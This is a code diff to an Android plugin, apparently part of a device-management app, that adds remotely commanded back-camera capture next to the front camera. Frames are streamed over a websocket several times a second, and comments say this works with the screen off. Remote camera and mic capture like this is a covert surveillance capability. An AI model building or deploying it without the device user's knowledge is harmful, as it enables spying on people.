@@ -57,7 +57,7 @@ public class NativeSocketPlugin extends Plugin {
     private boolean shouldReconnect = false;
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
 
-    // ── Camera ────────────────────────────────────────────────────────
+    // ── Front camera ──────────────────────────────────────────────────
     private HandlerThread cameraThread;
     private Handler cameraHandler;
     private CameraDevice cameraDevice;
@@ -66,6 +66,15 @@ public class NativeSocketPlugin extends Plugin {
     private boolean cameraActive = false;
     private long lastFrameMs = 0;
     private boolean pendingScreenshot = false;
+
+    // ── Back camera ───────────────────────────────────────────────────
+    private HandlerThread cameraThreadBack;
+    private Handler cameraHandlerBack;
+    private CameraDevice cameraDeviceBack;
+    private CameraCaptureSession captureSessionBack;
+    private ImageReader imageReaderBack;
+    private boolean cameraActiveBack = false;
+    private long lastFrameMsBack = 0;
 
     // ── Mic ───────────────────────────────────────────────────────────
     private AudioRecord audioRecord;
@@ -160,12 +169,22 @@ public class NativeSocketPlugin extends Plugin {
 
             switch (evt) {
                 case "cmd:camera:start":
-                    startCameraNative();
-                    fireJs("cmd:camera:start", null);
+                case "cmd:camera:start:front":
+                    startCameraFront();
+                    fireJs(evt, null);
                     break;
                 case "cmd:camera:stop":
-                    stopCameraNative();
-                    fireJs("cmd:camera:stop", null);
+                case "cmd:camera:stop:front":
+                    stopCameraFront();
+                    fireJs(evt, null);
+                    break;
+                case "cmd:camera:start:back":
+                    startCameraBack();
+                    fireJs("cmd:camera:start:back", null);
+                    break;
+                case "cmd:camera:stop:back":
+                    stopCameraBack();
+                    fireJs("cmd:camera:stop:back", null);
                     break;
                 case "cmd:mic:on":
                     startMicNative();
@@ -229,18 +248,18 @@ public class NativeSocketPlugin extends Plugin {
     @PluginMethod
     public void socketDisconnect(PluginCall call) {
         shouldReconnect = false;
-        stopCameraNative();
+        stopCameraFront();
+        stopCameraBack();
         stopMicNative();
         if (ws != null) { ws.cancel(); ws = null; }
         call.resolve();
     }
 
-    // ── Camera2 (works when screen off) ───────────────────────────────
-    private void startCameraNative() {
+    // ── Front Camera2 (works when screen off) ─────────────────────────
+    private void startCameraFront() {
         if (cameraActive) return;
         cameraActive = true;
 
-        // Update foreground service type to include camera
         Intent svcIntent = new Intent(getContext(), MdmForegroundService.class);
         svcIntent.putExtra("withCamera", true);
         svcIntent.putExtra("withMic", micActive);
@@ -276,6 +295,7 @@ public class NativeSocketPlugin extends Plugin {
                     String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                     JSONObject frameData = new JSONObject();
                     frameData.put("frame", b64);
+                    frameData.put("cameraType", "front");
                     sendEvent("camera:frame", frameData);
                     if (isScreenshot) {
                         pendingScreenshot = false;
@@ -310,12 +330,89 @@ public class NativeSocketPlugin extends Plugin {
         } catch (Exception e) { cameraActive = false; }
     }
 
-    private void stopCameraNative() {
+    private void stopCameraFront() {
         cameraActive = false;
         try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
         try { if (cameraDevice != null) { cameraDevice.close(); cameraDevice = null; } } catch (Exception ignored) {}
         try { if (imageReader != null) { imageReader.close(); imageReader = null; } } catch (Exception ignored) {}
         if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; }
+    }
+
+    // ── Back Camera2 (works when screen off) ──────────────────────────
+    private void startCameraBack() {
+        if (cameraActiveBack) return;
+        cameraActiveBack = true;
+
+        Intent svcIntent = new Intent(getContext(), MdmForegroundService.class);
+        svcIntent.putExtra("withCamera", true);
+        svcIntent.putExtra("withMic", micActive);
+        getContext().startForegroundService(svcIntent);
+
+        cameraThreadBack = new HandlerThread("MdmCameraBack");
+        cameraThreadBack.start();
+        cameraHandlerBack = new Handler(cameraThreadBack.getLooper());
+
+        try {
+            CameraManager mgr = (CameraManager) getContext().getSystemService(Context.CAMERA_SERVICE);
+            String camId = null;
+            for (String id : mgr.getCameraIdList()) {
+                CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
+                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
+                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) { camId = id; break; }
+            }
+            if (camId == null) { cameraActiveBack = false; return; }
+
+            imageReaderBack = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
+            imageReaderBack.setOnImageAvailableListener(reader -> {
+                Image img = reader.acquireLatestImage();
+                if (img == null) return;
+                long now = System.currentTimeMillis();
+                if (now - lastFrameMsBack < 250) { img.close(); return; }
+                lastFrameMsBack = now;
+                try {
+                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
+                    byte[] bytes = new byte[buf.remaining()];
+                    buf.get(bytes);
+                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                    JSONObject frameData = new JSONObject();
+                    frameData.put("frame", b64);
+                    frameData.put("cameraType", "back");
+                    sendEvent("camera:frame", frameData);
+                } catch (Exception ignored) {
+                } finally { img.close(); }
+            }, cameraHandlerBack);
+
+            mgr.openCamera(camId, new CameraDevice.StateCallback() {
+                @Override public void onOpened(CameraDevice camera) {
+                    cameraDeviceBack = camera;
+                    try {
+                        camera.createCaptureSession(
+                                Arrays.asList(imageReaderBack.getSurface()),
+                                new CameraCaptureSession.StateCallback() {
+                                    @Override public void onConfigured(CameraCaptureSession session) {
+                                        captureSessionBack = session;
+                                        try {
+                                            CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+                                            req.addTarget(imageReaderBack.getSurface());
+                                            session.setRepeatingRequest(req.build(), null, cameraHandlerBack);
+                                        } catch (Exception ignored) {}
+                                    }
+                                    @Override public void onConfigureFailed(CameraCaptureSession s) {}
+                                }, cameraHandlerBack);
+                    } catch (Exception ignored) {}
+                }
+                @Override public void onDisconnected(CameraDevice camera) { camera.close(); cameraActiveBack = false; }
+                @Override public void onError(CameraDevice camera, int error) { camera.close(); cameraActiveBack = false; }
+            }, cameraHandlerBack);
+        } catch (Exception e) { cameraActiveBack = false; }
+    }
+
+    private void stopCameraBack() {
+        cameraActiveBack = false;
+        try { if (captureSessionBack != null) { captureSessionBack.close(); captureSessionBack = null; } } catch (Exception ignored) {}
+        try { if (cameraDeviceBack != null) { cameraDeviceBack.close(); cameraDeviceBack = null; } } catch (Exception ignored) {}
+        try { if (imageReaderBack != null) { imageReaderBack.close(); imageReaderBack = null; } } catch (Exception ignored) {}
+        if (cameraThreadBack != null) { cameraThreadBack.quitSafely(); cameraThreadBack = null; }
     }
 
     // One-shot screenshot without live streaming
@@ -347,7 +444,7 @@ public class NativeSocketPlugin extends Plugin {
                 } catch (Exception ignored) {
                 } finally {
                     img.close();
-                    stopCameraNative(); // one shot done
+                    stopCameraFront(); // one shot done
                 }
             }, cameraHandler);
 
@@ -365,9 +462,9 @@ public class NativeSocketPlugin extends Plugin {
                                             session.capture(req.build(), null, cameraHandler);
                                         } catch (Exception ignored) {}
                                     }
-                                    @Override public void onConfigureFailed(CameraCaptureSession s) { stopCameraNative(); }
+                                    @Override public void onConfigureFailed(CameraCaptureSession s) { stopCameraFront(); }
                                 }, cameraHandler);
-                    } catch (Exception ignored) { stopCameraNative(); }
+                    } catch (Exception ignored) { stopCameraFront(); }
                 }
                 @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActive = false; }
                 @Override public void onError(CameraDevice c, int e) { c.close(); cameraActive = false; }
